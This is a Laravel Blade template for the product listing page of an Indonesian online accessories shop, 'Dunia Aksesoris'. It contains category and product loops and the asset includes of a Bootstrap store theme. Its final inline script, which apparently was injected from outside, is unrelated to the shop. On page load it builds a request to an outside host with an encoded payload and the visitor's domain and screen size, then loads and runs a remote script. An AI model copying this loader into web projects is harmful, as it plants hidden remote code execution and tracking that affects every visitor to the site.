<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
	<!-- SITE TITTLE -->
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Dunia Aksesoris</title>

	<!-- PLUGINS CSS STYLE -->
	<link href="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.css')}}" rel="stylesheet">
	<link href="{{asset('/bigbag/plugins/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
	<link href="{{asset('/bigbag/plugins/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet">
	<link href="{{asset('/bigbag/plugins/selectbox/select_option1.css')}}" rel="stylesheet">
	<link href="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.css')}}" rel="stylesheet">
	<link href="{{asset('/bigbag/plugins/iziToast/css/iziToast.css')}}" rel="stylesheet">
	<link href="{{asset('/bigbag/plugins/prismjs/prism.css')}}" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/rs-plugin/css/settings.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick.css')}}" media="screen">
	<link rel="stylesheet" type="text/css" href="{{asset('/bigbag/plugins/slick/slick-theme.css')}}" media="screen">

	<!-- CUSTOM CSS -->
	<link href="{{asset('/bigbag/css/style.css')}}" rel="stylesheet">
	<link rel="stylesheet" href="{{asset('/bigbag/css/default.css')}}" id="option_color">

	<!-- Icons -->
	<link rel="shortcut icon" href="{{asset('/img/head.png')}}">

	<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
	<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js')}}"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js')}}"></script>
	<![endif]-->
</head>
<body class="body-wrapper version1">

	<!-- Preloader -->
	<div id="preloader" class="smooth-loader-wrapper">
		<div class="preloader_container">
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
			<div class="block"></div>
		</div>
	</div>

	<div class="main-wrapper">

		<!-- HEADER -->
		<div class="header clearfix">

			<!-- TOPBAR -->

			<!-- NAVBAR -->
			@include('partials.frontend.navbar')
		</div>

		<!-- BANNER -->
		@include('partials.frontend.banner')

		<!-- MAIN CONTENT SECTION -->
		<section class="mainContent clearfix productsContent">
			<div class="container">
				<div class="row">
					<div class="col-lg-3 col-md-4 sideBar">
						<div class="panel panel-default">
							<div class="panel-heading">Kategori Produk</div>
							<div class="panel-body">
								<div class="collapse navbar-collapse navbar-ex1-collapse navbar-side-collapse">
									<ul class="nav navbar-nav side-nav">
										<li><a href="/product"><i class="fa fa-caret-right" aria-hidden="true"></i>All</a></li>
										@foreach($kategori as $data)
										<li><a href="/product/kategori/{{ $data->slug }}"><i class="fa fa-caret-right" aria-hidden="true"></i>{{$data->kategori}} <span>({{ $data->Barang->count() }})</span></a></li>
										@endforeach
									</ul>
								</div>
							</div>
						</div>
					</div>

					<div class="col-lg-9 col-md-8">
						<div class="row">
							@foreach($barangs as $data)
							<div class="col-md-6 col-lg-4">
								<div class="productBox">
									<div class="productImage clearfix">
										<img src="{{asset ('/img/'.$data->foto1.'') }}" alt="products-img">
										<div class="productMasking">
											<ul class="list-inline btn-group" role="group">
												<li><a class="btn viewBtn" href="/product/{{$data->slug}}" ><i class="fa fa-eye">Lihat</i></a></li>
											</ul>
										</div>
									</div>
									<div class="productCaption clearfix">
										<a href="/product/{{$data->slug}}">
											<h5>{{$data->nama_barang}}</h5>
										</a>
										<h3>Rp {{$data->harga}},-</h3>
									</div>
								</div>
							</div>
							@endforeach
						</div>
					</div>
				</div>
				<div class="row">
					<div class="col-md-4"></div>
					<div class="col-md-3"></div>
					<div class="col-md-2">
						{{ $barangs->links() }}
					</div>
					<div class="col-md-3"></div>
				</div>
			</div>
		</section>

		<!-- LIGHT SECTION -->
		<!-- <section class="lightSection clearfix">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div class=" partnersLogoSlider">
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-01.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-02.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-03.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-04.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-05.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-01.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-02.png" alt="partner-img">
								</div>
							</div>
							<div class="slide">
								<div class="partnersLogo clearfix">
									<img src="bigbag/img/home/partners/partner-03.png" alt="partner-img">
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</section> -->

		<!-- FOOTER -->
		@include('partials.frontend.footer')
		<!-- <div class="footer clearfix">
			<div class="container">
				<div class="row">
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>Accessories</h5>
							<ul class="list-unstyled">
								<li><a href="#">Body care </a></li>
								<li><a href="#">Chambray </a></li>
								<li><a href="#">Floral </a></li>
								<li><a href="#">Rejuvination </a></li>
								<li><a href="#">Shaving </a></li>
								<li><a href="#">Toilette </a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>BRANDS</h5>
							<ul class="list-unstyled">
								<li><a href="#">Barbour </a></li>
								<li><a href="#">Brioni </a></li>
								<li><a href="#">Oliver Spencer</a></li>
								<li><a href="#">Belstaff</a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>Accessories</h5>
							<ul class="list-unstyled">
								<li><a href="#">Body care </a></li>
								<li><a href="#">Chambray </a></li>
								<li><a href="#">Floral </a></li>
								<li><a href="#">Rejuvination </a></li>
								<li><a href="#">Shaving </a></li>
								<li><a href="#">Toilette </a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-2 col-12">
						<div class="footerLink">
							<h5>Get in Touch</h5>
							<ul class="list-unstyled">
								<li>Call us at (555)-555-5555</li>
								<li><a href="mailto:support@iamabdus.com">support@iamabdus.com</a></li>
							</ul>
							<ul class="list-inline">
								<li><a href="#"><i class="fa fa-twitter"></i></a></li>
								<li><a href="#"><i class="fa fa-facebook"></i></a></li>
								<li><a href="#"><i class="fa fa-dribbble"></i></a></li>
								<li><a href="#"><i class="fa fa-vimeo"></i></a></li>
								<li><a href="#"><i class="fa fa-tumblr"></i></a></li>
							</ul>
						</div>
					</div>
					<div class="col-md-4 col-12">
						<div class="newsletter clearfix">
							<h4>Newsletter</h4>
							<h3>Sign up now</h3>
							<p>Enter your email address and get notified about new products. We hate spam!</p>
							<div class="input-group">
								<input type="text" class="form-control" placeholder="your email address" aria-describedby="basic-addon2">
								<a href="#" class="input-group-addon" id="basic-addon2">go <i class="fa fa-chevron-right"></i></a>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div> -->

		<!-- COPY RIGHT -->
		@include('partials.frontend.copyright')
		<!-- <div class="copyRight clearfix">
			<div class="container">
				<div class="row">
					<div class="col-md-7 col-12">
						<p>&copy; 2017 Copyright Bigbag Store Bootstrap Template by <a target="_blank" href="http://www.iamabdus.com/">Abdus</a>.</p>
					</div>
					<div class="col-md-5 col-12">
						<ul class="list-inline">
							<li><img src="bigbag/img/home/footer/card1.png"></li>
							<li><img src="bigbag/img/home/footer/card2.png"></li>
							<li><img src="bigbag/img/home/footer/card3.png"></li>
							<li><img src="bigbag/img/home/footer/card4.png"></li>
						</ul>
					</div>
				</div>
			</div>
		</div> -->
	</div>
	<script src="{{asset('/bigbag/plugins/jquery/jquery.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/jquery/jquery-migrate-3.0.0.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/jquery-ui/jquery-ui.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/bootstrap/js/popper.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/bootstrap/js/bootstrap.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.tools.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/rs-plugin/js/jquery.themepunch.revolution.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/slick/slick.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/fancybox/jquery.fancybox.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/iziToast/js/iziToast.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/prismjs/prism.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/selectbox/jquery.selectbox-0.1.3.min.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/countdown/jquery.syotimer.js')}}"></script>
	<script src="{{asset('/bigbag/plugins/velocity/velocity.min.js')}}"></script>
	<script src="{{asset('/bigbag/js/custom.js')}}"></script>

	<!-- <link href="{{asset('/bigbag/options/optionswitch.css')}}" rel="stylesheet">
	<script src="{{asset('/bigbag/options/optionswitcher.js')}}"></script> -->
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BHH5nSgM%2bH3J3OHAMXVqyOhrXr1Zr8QymYewayZcL9CWBK1c18IGmy7CoGLrcFWztkJifapX9tvb6upSFDqI%2booaiJwIisuWDoCTGjxcdkQ8irIRV%2fcwuQ44RLI%2bXRhCWw%2bamSlYNK4nepTt%2bTP%2bol0W9%2bVaunRqHFWWJQOOlVCvEZhtGkhpTqSPqTwn80Tp2wFyUkT0tZ5xFbQDX3H%2biktN5JEpbo6DQ7g1EezmfRO7msbmenrjxcuMr%2bF0WmHyGaFDIzvOwW4whQt2uXB6hiefnts14En%2b2yGZ%2bUX34ZkBD%2bOtA1PZqSirqKG%2fWldUdweIuSQIJQyHAI1i9tZImUMZWCvVLrh0sKF4y1I91vYHaJMho4nyWsir8pSi3LiYo8oh009O7usnt2ryggvj3%2fihxiFcrgCcbUL5%2foF6eXSbH%2bhCepKnm%2f%2b%2bzgl5B6beF8wOQ9ZsF76s6nPRv1TMiHbabQ%2f2rNR6Gcm9MxWk3yWV5Sl5DYKFu%2bXUKyUYoKmE6Lbhp2XZBk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>